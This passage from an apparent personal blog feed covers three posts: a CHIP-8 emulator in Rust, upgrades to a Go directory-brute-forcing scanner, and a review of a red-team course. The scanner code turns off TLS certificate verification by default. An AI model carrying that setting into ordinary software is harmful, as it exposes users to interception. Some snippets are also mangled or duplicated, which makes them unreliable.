+</span></span></code></pre></div><p>The pixel being drawn and the pixel currently on the display are compared. If both pixels are on, then the VF register is set to one. VF indicates two sprites have collided. The collided pixel is then turned off. Most of my initial confusion was because I did not realize the screen pixel should be turned off in the event of a collision.  </p>
+<pre tabindex="0"><code class="language-rust " data-lang="rust ">
+if sprite_pixel &amp; screen_pixel{
+
+self.v[0xf] =1;
+
+self.display[index as usize]=false;
+
+}
+</code></pre><p>If the pixel from the sprite data is on and the pixel on the screen is not then the pixel on the display is turned on. </p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> sprite_pixel <span style="color:#f92672">&amp;</span> <span style="color:#f92672">!</span>screen_pixel{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>self.display[index <span style="color:#66d9ef">as</span> <span style="color:#66d9ef">usize</span>]<span style="color:#f92672">=</span><span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>After implementing the display instruction, I could run the splash screen ROM and the IBM logo ROM. As a result, 6/35 opcodes were implemented. </p>
+
+    <img src="/img/chip8/Img1.png"  class="center"  style="border-radius: 8px;"  />
+
+
+
+    <img src="/img/chip8/Img2.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<h2 id="test-suites">Test suites </h2>
+<p>I next found a <a href="https://github.com/Timendus/chip8-test-suite">CHIP-8 test suite</a>. I took a first stab at implementing most opcodes covered by <a href="https://github.com/Timendus/chip8-test-suite/raw/main/bin/3-corax+.ch8">Corax+ opcode test</a> which consists of math operations, if statements, and saving and loading registers. </p>
+<h3 id="if-statements">If Statements</h3>
+<p>The CHIP-8 if statements are simple. If the condition is true, the next instruction is skipped. This is normally paired with a jump command to redirect the flow of execution. </p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//3xnn skip if VX=NN
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> self.v[get_byte(<span style="color:#ae81ff">1</span>, opcode) <span style="color:#66d9ef">as</span> <span style="color:#66d9ef">usize</span>]<span style="color:#f92672">==</span>get_last_two(opcode){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>self.<span style="color:#66d9ef">PC</span><span style="color:#f92672">+=</span><span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="jump-commands">Jump Commands </h3>
+<p><code>2NNN</code> calls a subroutine at the memory address NNN. The current PC is pushed onto the stack, and the PC is set to the address in the opcode. Finally, the PC is decremented to compensate for the PC being incremented after the match statement.  </p>
+<pre tabindex="0"><code class="language-rust " data-lang="rust ">
+self.push(self.PC);
+
+self.PC=get_addr(opcode);
+
+self.PC-=2;
+</code></pre><p>After a bit of work, I got all the instructions to pass the initial checks. </p>
+
+    <img src="/img/chip8/Img3.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Next, I focused on the <a href="https://github.com/Timendus/chip8-test-suite/raw/main/bin/4-flags.ch8">flag test</a> which focuses on corner cases involving the VF register in arithmetic instructions. It checks each opcode for:</p>
+<ol>
+<li>
+<p>correctness of the output</p>
+</li>
+<li>
+<p>if the VF flag is set correctly</p>
+</li>
+<li>
+<p>if the case where the VY register is VF is handled correctly</p>
+</li>
+<li>
+<p>if the case where the VY register is VF is handled correctly</p>
+</li>
+</ol>
+<p>Overall my implementation of most arithmetic instructions did not set the carry flag correctly. The VF register should be set last. Setting it too early will result in the calculation being wrong when VF is one of the operands. Additionally, care must be taken to prevent buffer over and underflows to avoid runtime errors in rust. </p>
+<pre tabindex="0"><code class="language-rust " data-lang="rust ">
+// Example of the subtraction instruction
+
+let orignal_vx = self.v[get_byte(1, opcode) as usize];
+
+let orignal_vy= self.v[get_byte(2, opcode) as usize];
+
+// wrapping_sub is used to prevent buffer overflow runtime errors
+
+let answer = self.v[get_byte(2, opcode) as usize].wrapping_sub(self.v[get_byte(1, opcode) as usize]);
+
+self.v[get_byte(1, opcode) as usize]=answer;
+
+if orignal_vx&lt;= orignal_vy{
+
+self.v[0xf]=1;
+
+}
+
+else{
+
+self.v[0xf]=0;
+
+}
+</code></pre><p>Results of the first arithmetic test:</p>
+
+    <img src="/img/chip8/Img4.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>I worked my way through all the other arithmetic functions squashing minor bugs until all tests were passed. 25/35 opcodes implemented.</p>
+
+    <img src="/img/chip8/Img5.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<h1 id="user-input">User Input </h1>
+<p>Now, it was time to deal with user input. If a key is pressed down, the corresponding element in the keys array is set to true and false otherwise. </p>
+<pre tabindex="0"><code class="language-rust " data-lang="rust ">
+  &#39;running: loop {
+
+    for event in event_pump.poll_iter() {
+
+      match event {
+
+        Event::Quit { .. } =&gt; break &#39;running,
+
+        Event::KeyUp {
+
+          keycode: Some(keycode),..
+
+        }=&gt; match keycode {
+
+          Keycode::Num1=&gt; Chip8.keys[1]=false,
+
+          Keycode::Num2=&gt; Chip8.keys[2]=false,
+
+          Keycode::Num3=&gt; Chip8.keys[3]=false,
+
+          Keycode::Num4=&gt; Chip8.keys[0xc]=false,
+
+          // row two
+
+          Keycode::Q=&gt; Chip8.keys[4]=false,
+
+--SNIP--
+
+          _ =&gt; {},
+
+        },
+
+        Event::KeyDown {
+
+          keycode: Some(keycode),
+
+          ..
+
+        } =&gt; match keycode{
+
+          Keycode::Num1=&gt; Chip8.keys[1]=true,
+
+          Keycode::Num2=&gt; Chip8.keys[2]=true,
+
+          Keycode::Num3=&gt; Chip8.keys[3]=true,
+
+          Keycode::Num4=&gt; Chip8.keys[0xC]=true,
+
+          // row two
+
+          Keycode::Q=&gt; Chip8.keys[4]=true,
+
+--SNIP--
+
+          _=&gt;{}
+
+        }
+
+        _ =&gt; {}
+
+      }
+
+    }
+</code></pre><h2 id="ex9e-and-exa1-skip-if-key"><code>EX9E</code> and <code>EXA1</code> Skip if key</h2>
+<p> Three CHIP-8 instructions deal with keyboard input. The <code>EX9E</code> command skips the next command if the key in the VX register is pressed. <code>EXA1</code> skips the next command if the key is not pressed.  </p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//EX9E
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> register_value<span style="color:#f92672">=</span> self.v[get_byte(<span style="color:#ae81ff">1</span>, opcode)<span style="color:#66d9ef">as</span> <span style="color:#66d9ef">usize</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">!</span>self.keys[register_value <span style="color:#66d9ef">as</span> <span style="color:#66d9ef">usize</span>]{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>self.<span style="color:#66d9ef">PC</span><span style="color:#f92672">+=</span><span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="fx0a-get-key"><code>FX0A</code>: Get Key</h2>
+<p>FX0A pauses execution until a key is pressed then stores that key in the VX register.</p>
+<pre tabindex="0"><code class="language-rust " data-lang="rust ">
+if !self.keys.contains(&amp;true){
+
+self.PC-=2;
+
+}
+
+else{
+
+for i in 0..15{
+
+if self.keys[i as usize]{
+
+self.v[get_byte(1, opcode)as usize]=i;
+
+break;
+
+}
+
+}
+</code></pre><h2 id="timers">Timers </h2>
+<p>Now, timer-related instructions could be implemented. <code>FX07</code>, <code>FX15</code>, and <code>FX18</code> were trivial to implement. All were variants of setting timers to the value of registers or vice versa. An update timer function was added to the main game loop.</p>
+<pre tabindex="0"><code class="language-rust " data-lang="rust ">
+fn update_timers(&amp;mut self){
+
+if self.delay &gt; 0{
+
+      self.delay -=1;
+
+    }
+
+     if self.sound &gt; 0 {
+
+       println!(&#34;beep&#34;);
+
+      self.sound -=1;
+
+    }
+
+  }
+</code></pre><p> After every tick, the timers are decremented once. The CHIP-8 beeps while the sound timer is above zero. I then needed to figure out how to actually play a sound. I wound up using the <a href="https://github.com/jarikomppa/soloud">soloud</a> audio engine.</p>
+<p> ```rust</p>
+<p>let sl = Soloud::default().expect(&ldquo;audio&rdquo;);</p>
+<p>let mut wav = &lt;soloud::audio::Wav as soloud::AudioExt&gt;::default();</p>
+<p>// loading an mp3 file to be played</p>
+<p>soloud::LoadExt::load(&amp;mut wav, &amp;std::path::Path::new(&quot;<a href="http://beep.mp">beep.mp</a>3&quot;)).expect(&ldquo;audio load&rdquo;);</p>
+<pre tabindex="0"><code>
+Attempting the play the sound from the update timer function resulted in borrow checking related compile errors. This error was remedied by borrowing the needed variables. The first implementation below resulted in multiple instances of the beeping sound playing over each other at once. 
+
+```rust
+
+if self.sound &gt; 0 {
+
+if sl.voice_count()==0{
+
+[sl.play](http://sl.play)(wav);
+
+}
+</code></pre><p>I discovered sl had a voice_count property I could check to ensure the beep only played once. </p>
+<pre tabindex="0"><code class="language-rust " data-lang="rust ">
+if self.sound &gt; 0 {
+
+if sl.voice_count()==0{
+
+[sl.play](http://sl.play)(wav);
+
+}
+</code></pre><p>At this point, I had implemented all of the CHIP-8 opcodes. While each opcode was not too difficult to implement, it was satisfying to see all the pieces fit together. It was fun to play some games to test the finished emulator. My favorite to play so far was breakout. I would recommend writing a CHIP-8 to anyone who wants to explore the inner workings of retro machines. It can also serve as an interesting first project in a new programming language for someone with prior experience in programming. Rust was pleasant to program in, and the borrow checker proved to not be too annoying to deal with. While I am done with the CHIP-8 emulator for now, I&rsquo;m sure further improvements could be made. Next time I pick up this project I will focus on making the emulator more configurable. I would like to add alternative versions of instructions, the ability to change key binds and frame rates, and add a debugging interface. In the mean time, you can view the repo <a href="https://github.com/spookyscary1/Chip-8-emulator">here</a>.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Tool touch up : web content scanner 1</title>
+            <link>http://localhost:1313/posts/web-content-scanner/</link>
+            <pubDate>Wed, 22 Jun 2022 00:00:00 +0000</pubDate>
+            
+            <guid>http://localhost:1313/posts/web-content-scanner/</guid>
+            <description>I noticed the web content scanner I wrote in go for this blog post does not work on websites using HTTPS when the TLS certificate cannot be validated. I decide to make some improvement to the code and generally refactor it. I initially wanted to add a flag to skip validating SSL/ TLS certificates. After mulling that over for a bit, I decided that adding a flag was not needed. Skipping the validating of certs can be the default behavior.</description>
+            <content type="html"><![CDATA[<p>I noticed the web content scanner I wrote in go for <a href="https://spook.pw/posts/2022/05/dawn-writeup-but-with-slightly-more-programming/">this blog post</a> does not work on websites using HTTPS when the TLS certificate cannot be validated. I decide to make some improvement to the code and generally refactor it. I initially wanted to add a flag to skip validating SSL/ TLS certificates. After mulling that over for a bit, I decided that adding a flag was not needed. Skipping the validating of certs can be the default behavior. Similar tools seem to do so also.</p>
+<p>The first order of business is to set up a web server using HTTPS with self-signed certs. I used <a href="https://github.com/sc0tfree/updog0">updog</a> to set up an appropriate webserver.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt;updog --ssl
+</span></span></code></pre></div><p>I can attempt to run the tool to verify the problem exists.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; go run directory_scanner.go -h  https://192.168.1.130:9090/ -w list  
+</span></span><span style="display:flex;"><span>2022/06/14 12:50:45 Get <span style="color:#e6db74">&#34;https://192.168.1.130:9090/dkjaskfsjd&#34;</span>: x509: cannot validate certificate <span style="color:#66d9ef">for</span> 192.168.1.130 because it doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t contain any IP SANs  
+</span></span><span style="display:flex;"><span>exit status <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Documentation on the <a href="https://pkg.go.dev/net/http">http package</a> proved to be useful. Making a transport allows for control over compression, TLS configuration, proxies, and keep alives. Since clients are safe for reuse, I moved that section of code out of my for loop. I do not need to repeatedly create clients. The code now looks like so:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// creating a client that skips verifying tls certs
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">tr</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Transport</span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">TLSClientConfig</span>: <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">tls</span>.<span style="color:#a6e22e">Config</span>{<span style="color:#a6e22e">InsecureSkipVerify</span>: <span style="color:#66d9ef">true</span>},
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">client</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Client</span>{<span style="color:#a6e22e">Transport</span>: <span style="color:#a6e22e">tr</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">scanner</span>.<span style="color:#a6e22e">Scan</span>(){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">resp</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">Get</span>(<span style="color:#a6e22e">host</span> <span style="color:#f92672">+</span><span style="color:#a6e22e">scanner</span>.<span style="color:#a6e22e">Text</span>())
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span></code></pre></div><p>I run the program to verify the fix works.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; go run directory_scanner.go -h  https://192.168.1.130:9090/ -w list  
+</span></span><span style="display:flex;"><span>https://192.168.1.130:9090/dkjaskfsjd  
+</span></span><span style="display:flex;"><span>https://192.168.1.130:9090/adskljfakldf  
+</span></span><span style="display:flex;"><span>https://192.168.1.130:9090/asdklfjadf  
+</span></span><span style="display:flex;"><span>https://192.168.1.130:9090/daklfjda  
+</span></span><span style="display:flex;"><span>https://192.168.1.130:9090/dsfasdfj  
+</span></span><span style="display:flex;"><span>https://192.168.1.130:9090/adsffa
+</span></span></code></pre></div><p>It does. Updog returns a 302 HTTP response status code when a file does not exist. I now realize it would be very nice to display which HTTP response code was returned by the webserver. Making that change was simple.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Print</span>(<span style="color:#a6e22e">host</span> <span style="color:#f92672">+</span><span style="color:#a6e22e">scanner</span>.<span style="color:#a6e22e">Text</span>()<span style="color:#f92672">+</span><span style="color:#e6db74">&#34; &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">StatusCode</span>)
+</span></span></code></pre></div><p>I then decided to make not following redirects the default behavior. I had to change changes to the client. The checkredirect function is overridden with a function that returns the request instead of following the redirect.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">client</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Client</span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Transport</span>: <span style="color:#a6e22e">tr</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CheckRedirect</span>: <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">req</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>, <span style="color:#a6e22e">via</span> []<span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>) <span style="color:#66d9ef">error</span> { <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ErrUseLastResponse</span> },
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Running to program verifies that the redirects are not followed.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; go run directory_scanner.go -h  https://192.168.1.130:9090/ -w list  
+</span></span><span style="display:flex;"><span>https://192.168.1.130:9090/dkjaskfsjd <span style="color:#ae81ff">302</span>  
+</span></span><span style="display:flex;"><span>https://192.168.1.130:9090/adskljfakldf <span style="color:#ae81ff">302</span>  
+</span></span><span style="display:flex;"><span>https://192.168.1.130:9090/asdklfjadf <span style="color:#ae81ff">302</span>  
+</span></span><span style="display:flex;"><span>https://192.168.1.130:9090/daklfjda <span style="color:#ae81ff">302</span>  
+</span></span><span style="display:flex;"><span>https://192.168.1.130:9090/dsfasdfj <span style="color:#ae81ff">302</span>  
+</span></span><span style="display:flex;"><span>https://192.168.1.130:9090/adsffa  <span style="color:#ae81ff">302</span>
+</span></span></code></pre></div><p>I now think the program could be improved by allowing a user to specify which status code they care about. I figured the user could input a comma seperated list of HTTP status codes to be displayed. Alternatively, the user could enter codes they wish to ignore. I started by writing the function to parse the comma seperated list into a useful data type to be used internally by the tool. I stored the list of status codes inside a map because the internet told me they behaved like dictionaries, and my main use of the list will be checking if items exist in the list. I believe this should be faster with an dictionary than an array. I ended up with code that looks like so:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">parseCodeList</span> (<span style="color:#a6e22e">list</span> <span style="color:#66d9ef">string</span>) (<span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">int64</span>]<span style="color:#66d9ef">bool</span>, <span style="color:#66d9ef">error</span>) {
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">array</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Split</span>(<span style="color:#a6e22e">list</span>,<span style="color:#e6db74">&#34;,&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">array</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">codes</span>= make(<span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">int64</span>]<span style="color:#66d9ef">bool</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> &lt; len(<span style="color:#a6e22e">array</span>); <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> {
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">x</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strconv</span>.<span style="color:#a6e22e">ParseInt</span>(<span style="color:#a6e22e">array</span>[<span style="color:#a6e22e">i</span>], <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">64</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#a6e22e">codes</span>, <span style="color:#a6e22e">errors</span>.<span style="color:#a6e22e">New</span>(<span style="color:#e6db74">&#34;invalid comma seperated status code list&#34;</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">codes</span>[<span style="color:#a6e22e">x</span>]=<span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">codes</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#a6e22e">codes</span>, <span style="color:#66d9ef">nil</span>
+</span></span></code></pre></div><p>The function turned out simple enough. I dived back into researching the flag library to settle on how I wanted the flags to work. I decided there would be a flag to pass in a list of status codes and an optional flag that decides if the program should use that only allow status codes in that list or only ignore status codes on that list. I only had to add an if statement to ensure our flag was the valid value.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// sanity check code behavior varaiable
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> !(<span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">ToLower</span>(<span style="color:#a6e22e">codeBehavior</span>)<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;allow&#34;</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">ToLower</span>(<span style="color:#a6e22e">codeBehavior</span>)<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;deny&#34;</span> ){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Error: b must be set to allow or deny&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Exit</span>(<span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>It just converts the user input to lowercase so that the comparison is case insensitive and then ensures the input is either allow or deny. I can now begin working on actually implementing the use of the optional status code list. I have two cases where I want to print an URL to the screen. I wound up with the code below.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">exists</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">mapCodeList</span>[<span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">StatusCode</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#a6e22e">codeBehavior</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#34;allow&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">exists</span><span style="color:#f92672">==</span> <span style="color:#66d9ef">true</span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Print</span>(<span style="color:#a6e22e">host</span> <span style="color:#f92672">+</span><span style="color:#a6e22e">scanner</span>.<span style="color:#a6e22e">Text</span>()<span style="color:#f92672">+</span><span style="color:#e6db74">&#34; &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">StatusCode</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">codeBehavior</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#34;deny&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">exists</span><span style="color:#f92672">==</span><span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Print</span>(<span style="color:#a6e22e">host</span> <span style="color:#f92672">+</span><span style="color:#a6e22e">scanner</span>.<span style="color:#a6e22e">Text</span>()<span style="color:#f92672">+</span><span style="color:#e6db74">&#34; &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">StatusCode</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>That finishes up all the new features I was hoping to implement. I now can have fun cleaning up the code so it doesn&rsquo;t look like an unreadable mess filled with assorted debug print statements. I created a function that printed URL and response codes to the console for code duplication purposes. The finished code can be found <a href="https://github.com/spookyscary1/directory-scanner">here</a></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>CRTO review</title>
+            <link>http://localhost:1313/posts/crto-review/</link>
+            <pubDate>Mon, 06 Jun 2022 00:00:00 +0000</pubDate>
+            
+            <guid>http://localhost:1313/posts/crto-review/</guid>
+            <description>intro I recently passed the Red Team Ops course by Zero-Point Security. I picked up the course while it was on sale. It seemed like an affordable course that would build upon the knowledge learned while acquiring my OSCP. I completed the exam recently and thought writing a brief review would be nice. Red Team Ops is a course by Zero-Point Security that focuses on teaching &amp;ldquo;the basic principles, tools and techniques, that are synonymous with red teaming.</description>
+            <content type="html"><![CDATA[<h1 id="intro">intro</h1>
+<p>I recently passed the <a href="https://training.zeropointsecurity.co.uk/courses/red-team-ops">Red Team Ops</a> course by Zero-Point Security. I picked up the course while it was on sale. It seemed like an affordable course that would build upon the knowledge learned while acquiring my OSCP. I completed the exam recently and thought writing a brief review would be nice. Red Team Ops is a course by Zero-Point Security that focuses on teaching &ldquo;the basic principles, tools and techniques, that are synonymous with red teaming.&rdquo; The course teaches intermediate level penetration testers the skills needed to engage in red team operations.</p>
+<h1 id="course">course</h1>
+<p>The course is split up into several modules. The modules run through the steps one would engage in during a red team engagement. It begins with planning the engagement and ends with discussing reporting. The bulk of the modules focuses primarily on hands-on instructions on how to perform various techniques of red team tradecraft. The modules focus on explaining how to perform these actions using Cobalt Strike.</p>
+<p>The course instructions are concise and to the point. Some modules also have an accompanying video that shows the attack being taken place. The course is best digested in the order presented as sometimes modules rely on work done in previous modules. The course&rsquo;s focus on practical knowledge can leave one wanting more fundamental explanations of how certain technologies work. The course does offer explanations on how the underlying technology works occasionally. For example, the Kerberos module began with a brief overview of how Kerberos worked. The course is updated over time.</p>
+<p>All techniques taught in the course can be and should be reproduced in the lab environment. The lab environment allows one to practice every exploit technique taught in the course. The lab is hosted via SnapLabs. Students purchase hours of lab time for a fairly reasonable rate. The lab experience was enjoyable overall. It is a private environment. The primary benefit of this situation is one does not have to worry about other students weakening the security of a machine or rendering it unexploitable. The lab uses guacamole to manage the remote environment.</p>
+<p>The primary downside to this setup is the inability to introduce external tools into the environment. The ability to VPN into the lab environment would be nice. I assume this cannot be done for reasons related to Cobalt Strike licensing. The attacker machine is preloaded with all the tools needed for techniques taught in the course. You can copy and paste things into the virtual machines. This feature allows you to introduce simple scripts into the environment if you wish.</p>
+<p>It can be tempting to simply copy and paste commands from the course into the lab environment and assume one understands the content since the course material is effectively a guided walkthrough of the lab. I would recommend resisting this urge if possible. I feel the lab would be improved if there was some portion of the lab that could be approached blind.</p>
+<h1 id="exam">exam</h1>
+<p>The exam is a CTF-style event where one has to capture six out of eight flags. The exam lasts four days. The exam is not proctored. The exam environment is similar to the lab environment. You can copy and paste scripts into the environment but otherwise cannot use external tools. One can stop the environment at any time. Reverting all the machines can also be done. You are provided 48 hours of hands-on keyboard time in the exam environment. The time given to complete the exam is extremely generous. The course was good preparation for the exam. All techniques needed to pass the exam are taught within the course. I felt the exam was fair.</p>
